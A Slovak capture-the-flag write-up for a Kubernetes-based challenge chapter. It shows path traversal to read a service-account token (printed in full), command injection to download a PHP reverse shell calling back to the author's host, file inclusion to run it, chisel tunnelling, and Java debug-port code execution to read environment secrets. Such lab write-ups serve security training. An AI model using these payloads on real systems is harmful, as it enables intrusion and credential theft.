# Zadanie #

> Hi, TCC-CSIRT analyst,
> 
> do you know the feeling when, after a demanding shift, you fall into lucid dreaming and even in your sleep, you encounter tricky problems? Help a colleague solve tasks in the complex and interconnected world of LORE, where it is challenging to distinguish reality from fantasy.
> 
> - The entry point to LORE is at [http://intro.lore.tcc](http://intro.lore.tcc "http://intro.lore.tcc").

> See you in the next incident!
> 
> **Hint1:**
> Be sure you enter flag for correct chapter.
> 
> 
> **Hint2:**
> In this realm, challenges should be conquered in a precise order, and to triumph over some, you'll need artifacts acquired from others - a unique twist that defies the norms of typical CTF challenges.
> 
> **Hint3:**
> All systems related to Chapter 3 restarts on failed healthcheck (5mins).

----------

# Riešenie #

Na stránke intro máme 4 slajdy, každý pre kždú kapitolu. Každý obsahuje nejakú vetu, ktorá sa zdá byť nejakým dodatočným hintom

> [3 Bounded](http://jgames.lore.tcc/ "3 Bounded")
> 
> A Travel bounds,
> The Origin and the destination,
> Anyway, it is cloud.

Navštívime stránku http://jgames.lore.tcc/, kde však nevidíme nič zaujímavé na prvý pohľad, akurát nejaké poďakovanie na jeden github repozitár, z ktorého sa inšpirovali, ale zdrojáky sú tie isté. Enumerácia a scan portov neukázali nič užitočné. Čo je prekvapivé je Hint2, ktorý hovorí, že budeme potrebovať artefakty z predošlých úloh. Dúfajme, že z jednej vetvy.

Prvé, čo bije do očí z predošlých úloh sú premenné pre KUBERNETES...  Skúsime pohľadať artefakty z tejto oblasti, napríklad secrets. Na oboch predošlých serveroch môžeme prezerať súbory, tak  skúsime 

    /var/run/secrets/kubernetes.io/serviceaccount/token
    /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
    /var/run/secrets/kubernetes.io/serviceaccount/namespace 

na cgite sa mi podarilo nájsť tieto súbory

    curl http://cgit.lore.tcc/cgit.cgi/foo/objects/?path=../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token

	eyJhbGciOiJSUzI1NiIsImtpZCI6ImVVNVZ4TmlMdmFNaV9STFNBS3NvSnNwd0VmcUJYWkhfMGY2UGpwNDN3aTQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYxOTI0NTI1LCJpYXQiOjE3MzAzODg1MjUsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjZ2l0IiwicG9kIjp7Im5hbWUiOiJjZ2l0LTY5NDlmOGM3NWQtcDY4azYiLCJ1aWQiOiI4NGM5Mjc4Mi0zODJjLTRhZmMtODVjYS05MGNmYTFlMGVmNzEifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlZmF1bHQiLCJ1aWQiOiIzYzMzMWJhMS1jMjE2LTQ1MDMtOWY4NS1kZjMwZWE0MWMzZmYifSwid2FybmFmdGVyIjoxNzMwMzkyMTMyfSwibmJmIjoxNzMwMzg4NTI1LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6Y2dpdDpkZWZhdWx0In0.ctc0KkTywdESsp80p7uksCAPYSaf1DRvO1IWBi4OcMg8mIGtqQxt9n3lCpySYodg-aMZdyVWFzggeKFrgIgJkdaVPr1Ag9HR8Oxu2k9TviTSjueS2kq7s3_gbQSafLM8r6vWhiTBzcMnYwE5sKWCgFB5EBkMaqtRqonB7G_EdeSvh3pzhX_iNj772zAhaforuvnVcXXmCn3UllKgn9qSo2XaQW6obomhDGYvCEVeAetBz4QSwWptS-NbCRks4bIGAHNZEe22KgRNemtlXYB3YPlhBFl-B7R1jdXQrnuuR0bpU18bQinvhyGLWV8yuRkAKk63z_lDWYFX0t1wbV2x-w

Máme token, máme server, skúsime kubernetes príkaz

    kubectl --token=eyJhbGciOiJSUzI1NiIsImtpZCI6ImVVNVZ4TmlMdmFNaV9STFNBS3NvSnNwd0VmcUJYWkhfMGY2UGpwNDN3aTQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzYxOTI0NTI1LCJpYXQiOjE3MzAzODg1MjUsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjZ2l0IiwicG9kIjp7Im5hbWUiOiJjZ2l0LTY5NDlmOGM3NWQtcDY4azYiLCJ1aWQiOiI4NGM5Mjc4Mi0zODJjLTRhZmMtODVjYS05MGNmYTFlMGVmNzEifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlZmF1bHQiLCJ1aWQiOiIzYzMzMWJhMS1jMjE2LTQ1MDMtOWY4NS1kZjMwZWE0MWMzZmYifSwid2FybmFmdGVyIjoxNzMwMzkyMTMyfSwibmJmIjoxNzMwMzg4NTI1LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6Y2dpdDpkZWZhdWx0In0.ctc0KkTywdESsp80p7uksCAPYSaf1DRvO1IWBi4OcMg8mIGtqQxt9n3lCpySYodg-aMZdyVWFzggeKFrgIgJkdaVPr1Ag9HR8Oxu2k9TviTSjueS2kq7s3_gbQSafLM8r6vWhiTBzcMnYwE5sKWCgFB5EBkMaqtRqonB7G_EdeSvh3pzhX_iNj772zAhaforuvnVcXXmCn3UllKgn9qSo2XaQW6obomhDGYvCEVeAetBz4QSwWptS-NbCRks4bIGAHNZEe22KgRNemtlXYB3YPlhBFl-B7R1jdXQrnuuR0bpU18bQinvhyGLWV8yuRkAKk63z_lDWYFX0t1wbV2x-w --server=https://10.99.24.81/ --insecure-skip-tls-verify=true get services --all-namespaces

    The connection to the server 10.99.24.81 was refused - did you specify the right host or port?

Po preskenovaní port som skúsil všetky otvorené a pri 6443 sa to chytilo a vrátilo mi

|NAMESPACE|NAME|TYPE|CLUSTER-IP|EXTERNAL-IP|PORT(S)|AGE|
|-
|calico-apiserver|calico-api|ClusterIP|192.168.200.196|<none>|443/TCP|67d|
|calico-system|calico-kube-controllers-metrics|ClusterIP|None|<none>|9094/TCP|67d|
|calico-system|calico-typha|ClusterIP|192.168.249.0|<none>|5473/TCP|67d|
|cgit|cgit-web|ClusterIP|192.168.134.179|<none>|80/TCP|67d|
|default|kubernetes|ClusterIP|192.168.128.1|<none>|443/TCP|67d|
|default|whoami-service|ClusterIP|192.168.144.8|<none>|80/TCP|67d|
|ingress-nginx|ingress-nginx-controller|LoadBalancer|192.168.143.7|10.99.24.82|80:30820/TCP,443:32644/TCP|67d|
|ingress-nginx|ingress-nginx-controller-admission|ClusterIP|192.168.248.149|<none>|443/TCP|67d|
|intro|intro-web|ClusterIP|192.168.249.6|<none>|80/TCP|67d|
|jgames|jgames-debug|ClusterIP|192.168.183.255|<none>|5005/TCP|67d|
|jgames|jgames-web|ClusterIP|192.168.207.69|<none>|80/TCP|67d|
|kube-system|kube-dns|ClusterIP|192.168.128.10|<none>|53/UDP,53/TCP,9153/TCP|67d|
|metallb-system|webhook-service|ClusterIP|192.168.224.62|<none>|443/TCP|67d||
|pimpam|pimpam-db|ClusterIP|192.168.167.76|<none>|3306/TCP|67d|
|pimpam|pimpam-web|ClusterIP|192.168.200.130|<none>|80/TCP|67d|
|sam-operator|sam-web|ClusterIP|192.168.142.180|<none>|80/TCP|67d|

.

Vidíme, že pre jgames bežia dve služby, web a debug... Debug beží na porte 5005, čo je známý port pre java debug protokol. na server sa dostaneme ale len z rozsahu 192.168.0.0/16, takže budeme musieť použiť niektorý zo serverov predtým. Jediný vhodný kandidát je pimpam, kedže možeme vykonávať príkazy, môžeme zrejme vytvoriť aj reverse shell.

Pri troche bádania som si všimol, že na pimpame je možnosť voľne zapisovať do priečinka `/tmp`, zistil som zobrazením cez príkaz `ls /tmp` cez ten curl command.. Rovnako je tam ešte jedna zraniteľnosť , dokážem si importnuť a spustiť akékoľvek php z akéhokeľvek priečinka cez endpoint 

`http://pimpam.lore.tcc/app/dashboard/widgets/?section=../../../../../../tmp/revshell`

 Zo zdrojáku daného endpointu

```
if(!file_exists(dirname(__FILE__)."/".$_GET['section'].".php"))		
{ 
$_REQUEST['section']="404"; print "<div id='error'>"; 
include_once('app/error.php'); print "</div>"; 
}
else
{
include(dirname(__FILE__) . "/".$_GET['section'].".php");
}
```
vidíme, že možem includnuť akýkoľvek súbor, pokiaľ má príponu php, akurát nesmiem zadať php, pretože to tam vloží za mňa. Toto mi teda vykoná /tmp/revshell.php, kde si vložím náš malicious script na otvorenie revershe shell.. Môj kali má vpn ip 10.200.0.14, takže náš skript bude vyzerať takto

    <?php
    $sock=fsockopen("10.200.0.14", 3434);
    $proc=proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
    ?>

zvolil som si random port, napríklad 3434.

Uložíme do /home/kali/ ako rv.php
spustíme php server, budeme počúvať požiadavky na porte 8080

	┌──(kali㉿kali)-[~]
    └─$ python -m http.server 8080
    Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
    

keď nám beží http server na kali, tak uložíme na pimpam do /tmp/rvp.php pomocou 

    curl "http://pimpam.lore.tcc/app/subnets/scan/subnet-scan-telnet.php" -X POST --data "port=80&debug=1&subnetId=4;curl 10.200.0.14:8080/rv.php -o /tmp/rv.php ;" 

Parameter -o uloží output, kedže to spúšťame akoby z pimpamu, tak sa to uloží tam.
PHP máme teda na serveri, spustíme pwncat-cs (ak nemáš - `https://pypi.org/project/pwncat-cs/`)

    ┌──(kali㉿kali)-[~/.local/bin]
    └─$ ./pwncat-cs -lp 3434
    [12:53:09] Welcome to pwncat 🐈! 
    bound to 0.0.0.0:3434

beží nam počúvanie na porte 3434 z pár krokov pred a teraz spustíme rv.php z /tmp pomocou

    curl http://pimpam.lore.tcc/app/dashboard/widgets/?section=../../../../../../tmp/rv

aby sme invokli spojeneie a zobrazí sa nám na pwncat-cs toto

    [12:54:48] received connection from 10.99.24.81:41905  bind.py:84
    [12:54:48] 0.0.0.0:3434: upgrading from /bin/dash to /bin/bash manager.py:957
    [12:54:49] 10.99.24.81:41905: registered new host w/ dbmanager.py:957
    (local) pwncat$
    Active Session: 10.99.24.81:41905 

stlačíme Ctrl+D, to nás prepne na remote 

    (remote) www-data@pimpam-5858b674c9-vd6x8:/var/www/html/app/dashboard/widgets$ 
    

a máme revershe shel a môžeme zadávať príkazy ako sa nám zachce (podľa user rights samozrejme). Popozeráme sa, aké máme možnosti, ktoré binárky tu máme... Po niekoľko desiatok minútach a pomoci chat gpt som zistil, že je tu jedna veľmi užitočná binárka chisel, vďaka ktorej si vieme vytvoriť užitočný tunel a z nášho kaliho cez proxychains pivotovať v rozhashu 192.168.x.x, vďaka čomu sa dostaneme na 192.168.183.255:5005

    (remote) www-data@pimpam-5858b674c9-vd6x8:/tmp$ chisel -v
    1.9.1

Potrebujem si teda stiahnuť verziu 1.9.1, keď mám zadám u seba v novom terminal okne napríklad 

	┌──(kali㉿kali)-[~]
    └─$ chisel server -p 8000 --reverse -v
    2024/10/31 13:17:12 server: Reverse tunnelling enabled
    2024/10/31 13:17:12 server: Fingerprint 0UNr5eUi0mmbGDHGA/yQzGiYxhSrJOjbWOatAGaV3iw=
    2024/10/31 13:17:12 server: Listening on http://0.0.0.0:8000

počúvam v tomto prípade na 8080 a počkám na spojenie zo servera pimpam, kde zadám príkaz 

	chisel client -v 10.200.0.25:8000 R:8888:socks

a okamžite sa mi vytvorí spojenie a socks5 prxy na porte 8888... Teraz nastavím proxychains cez `sudo nano /etc/proxychains4.conf` aby súbor vyzeral takto

    # proxychains.conf  VER 4.x
    dynamic_chain
    proxy_dns
    remote_dns_subnet 224
    tcp_read_time_out 15000
    tcp_connect_time_out 8000
    [ProxyList]
    socks5 127.0.0.1 8888

Zadáme `proxychains jdb -attach 192.168.183.255:5005`

    ┌──(kali㉿kali)-[~]
    └─$ proxychains jdb -attach 192.168.183.255:5005
    [proxychains] config file found: /etc/proxychains4.conf
    [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
    [proxychains] DLL init: proxychains-ng 4.17
    Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
    [proxychains] Dynamic chain  ...  127.0.0.1:8888  ...  192.168.183.255:5005  ...  OK
    Set uncaught java.lang.Throwable
    Set deferred uncaught java.lang.Throwable
    Initializing jdb ...
    > 
    
Tu zadáme príkaz classes, čo nám vylistuje zoznam všetkých tried, ktoré sa nám možno zídu, zaujíma nas nejaká, ktorá obsahuje metódu run(), aby sme mohli zadávať systémové príkazy a máme tam jednu takú, na ktorú si môžeme dať breakpoint

Od tohto bodu nás môže kedykoľvek kicknúť, pretože ako je písne v hinte, server sa každých 5 minút resetne

do jdb konzoly zadáme príkaz 

	stop in org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.run()

a počkáme, kým ho hitne, to zistíme, keď uvidíme niečo podobné ako toto

	Breakpoint hit: "thread=Catalina-utility-1", org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.run(), line=1,154 bci=0

Následne zadáme príkaz 

	za Catalina-utility-1[1] zadáme toto nižšie 
	print new java.lang.String(new java.lang.Runtime().exec("cat /proc/self/environ").getInputStream().readAllBytes())

Dostaneme odpoveď

     new java.lang.String(new java.lang.Runtime().exec("cat /proc/self/environ").getInputStream().readAllBytes()) = "KUBERNETES_SERVICE_PORT_HTTPS=443JGAMES_WEB_PORT=tcp://192.168.207.69:80KUBERNETES_SERVICE_PORT=443JGAMES_DEBUG_SERVICE_PORT_DEBUG=5005HOSTNAME=jgames-76b9f4888b-kfgmpLANGUAGE=en_US:enJAVA_HOME=/opt/java/openjdkJGAMES_DEBUG_PORT_5005_TCP_ADDR=192.168.183.255GPG_KEYS=5C3C5F3E314C866292F359A8F3AD5C94A67F707E A9C5DF4D22E99998D9875A5110C01C5A2F6059E7JGAMES_WEB_PORT_80_TCP_PROTO=tcpJGAMES_DEBUG_SERVICE_PORT=5005PWD=/usr/local/tomcatTOMCAT_SHA512=0a62e55c1ff9f8f04d7aff938764eac46c289eda888abf43de74a82ceb7d879e94a36ea3e5e46186bc231f07871fcc4c58f11e026f51d4487a473badb21e9355TOMCAT_MAJOR=10HOME=/usr/local/tomcatLANG=en_US.UTF-8KUBERNETES_PORT_443_TCP=tcp://192.168.128.1:443JGAMES_DEBUG_PORT_5005_TCP_PORT=5005JGAMES_DEBUG_SERVICE_HOST=192.168.183.255TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-libFLAG=FLAG{ijBw-pfxY-Scgo-GJKO}JGAMES_DEBUG_PORT=tcp://192.168.183.255:5005JGAMES_WEB_SERVICE_PORT=80CATALINA_HOME=/usr/local/tomcatJAVA_TOOL_OPTIONS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005JGAMES_WEB_SERVICE_HOST=192.168.207.69JGAMES_WEB_PORT_80_TCP=tcp://192.168.207.69:80SHLVL=0JGAMES_WEB_SERVICE_PORT_WEB=80KUBERNETES_PORT_443_TCP_PROTO=tcpJGAMES_DEBUG_PORT_5005_TCP_PROTO=tcpKUBERNETES_PORT_443_TCP_ADDR=192.168.128.1LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-libJGAMES_WEB_PORT_80_TCP_ADDR=192.168.207.69KUBERNETES_SERVICE_HOST=192.168.128.1JGAMES_DEBUG_PORT_5005_TCP=tcp://192.168.183.255:5005LC_ALL=en_US.UTF-8KUBERNETES_PORT=tcp://192.168.128.1:443KUBERNETES_PORT_443_TCP_PORT=443PATH=/usr/local/tomcat/bin:/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binJGAMES_WEB_PORT_80_TCP_PORT=80TOMCAT_VERSION=10.1.26JAVA_VERSION=jdk-21.0.4+7"

trochu upravíme

    KUBERNETES_SERVICE_PORT_HTTPS=443
    JGAMES_WEB_PORT=tcp://192.168.207.69:80
    KUBERNETES_SERVICE_PORT=443
    JGAMES_DEBUG_SERVICE_PORT_DEBUG=5005
    HOSTNAME=jgames-76b9f4888b-kfgmp
    LANGUAGE=en_US:en
    JAVA_HOME=/opt/java/openjdk
    JGAMES_DEBUG_PORT_5005_TCP_ADDR=192.168.183.255
    GPG_KEYS=5C3C5F3E314C866292F359A8F3AD5C94A67F707E A9C5DF4D22E99998D9875A5110C01C5A2F6059E7
    JGAMES_WEB_PORT_80_TCP_PROTO=tcp
    JGAMES_DEBUG_SERVICE_PORT=5005
    PWD=/usr/local/tomcat
	TOMCAT_SHA512=0a62e55c1ff9f8f04d7aff938764eac46c289eda888abf43de74a82ceb7d879e94a36ea3e5e46186bc231f07871fcc4c58f11e026f51d4487a473badb21e9355
    TOMCAT_MAJOR=10
    HOME=/usr/local/tomcat
    LANG=en_US.UTF-8
    KUBERNETES_PORT_443_TCP=tcp://192.168.128.1:443
    JGAMES_DEBUG_PORT_5005_TCP_PORT=5005
    JGAMES_DEBUG_SERVICE_HOST=192.168.183.255
    TOMCAT_NATIVE_LIBDIR=/usr/local/tomcat/native-jni-lib

    FLAG=FLAG{ijBw-pfxY-Scgo-GJKO}

    JGAMES_DEBUG_PORT=tcp://192.168.183.255:5005
    JGAMES_WEB_SERVICE_PORT=80
    CATALINA_HOME=/usr/local/tomcat
    JAVA_TOOL_OPTIONS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005
    JGAMES_WEB_SERVICE_HOST=192.168.207.69
    JGAMES_WEB_PORT_80_TCP=tcp://192.168.207.69:80
    SHLVL=0
    JGAMES_WEB_SERVICE_PORT_WEB=80
    KUBERNETES_PORT_443_TCP_PROTO=tcp
    JGAMES_DEBUG_PORT_5005_TCP_PROTO=tcp
    KUBERNETES_PORT_443_TCP_ADDR=192.168.128.1
    LD_LIBRARY_PATH=/usr/local/tomcat/native-jni-lib
    JGAMES_WEB_PORT_80_TCP_ADDR=192.168.207.69
    KUBERNETES_SERVICE_HOST=192.168.128.1
    JGAMES_DEBUG_PORT_5005_TCP=tcp://192.168.183.255:5005
    LC_ALL=en_US.UTF-8
    KUBERNETES_PORT=tcp://192.168.128.1:443
    KUBERNETES_PORT_443_TCP_PORT=443
    PATH=/usr/local/tomcat/bin:/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    JGAMES_WEB_PORT_80_TCP_PORT=80
    TOMCAT_VERSION=10.1.26
    JAVA_VERSION=jdk-21.0.4+7
    
kde vidíme aj vlajku

	FLAG=FLAG{ijBw-pfxY-Scgo-GJKO}




----------

## Vlajka ##
    FLAG{ijBw-pfxY-Scgo-GJKO}